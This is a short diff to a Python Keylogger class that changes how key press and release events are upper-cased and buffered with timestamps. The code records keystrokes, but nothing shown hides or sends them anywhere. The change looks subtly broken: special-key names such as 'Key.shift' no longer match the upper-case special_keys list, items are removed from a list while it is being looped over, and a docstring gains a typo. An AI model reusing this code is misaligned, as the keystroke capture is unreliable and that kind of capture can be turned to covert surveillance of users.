@@ -22,17 +22,19 @@ class Keylogger:
         """
         Event method if a key was released
         :param key: The released key
-        :return: true, if the listening should be continued
+        :return: true, if the listening should be continuedl
         """
-        key_string = str(key).upper()
+        key_string = str(key)
+        if key_string.replace('\'', '').isalpha():
+            key_string = key_string.upper()
         if key_string not in self.__pressed_keys:
             return True
         release_time = time.time()
-        # Special Case if key is shift
+        # Special Case when used special keys
         special_keys = ("KEY.SHIFT", "KEY.CTRL_L", "KEY.ALT_L", "KEY.ALT_GR", "KEY.SHIFT_R", "KEY.ALT_R", "KEY.CTRL_R")
         if key_string in special_keys:
             for char in self.__pressed_keys:
-                if not char.replace('\'', '').isalpha() and char not in special_keys:
+                if char not in special_keys:
                     self.__buffer.write_to_buffer([char, release_time, False])
                     self.__pressed_keys.remove(char)
         self.__buffer.write_to_buffer([key_string, release_time, False])
@@ -45,7 +47,9 @@ class Keylogger:
         :param key: The pressed key
         :return: true, if the listening should be continued
         """
-        key_string = str(key).upper()
+        key_string = str(key)
+        if key_string.replace('\'', '').isalpha():
+            key_string = key_string.upper()
         if key_string in self.__pressed_keys:
             return True
         self.__pressed_keys.append(key_string)
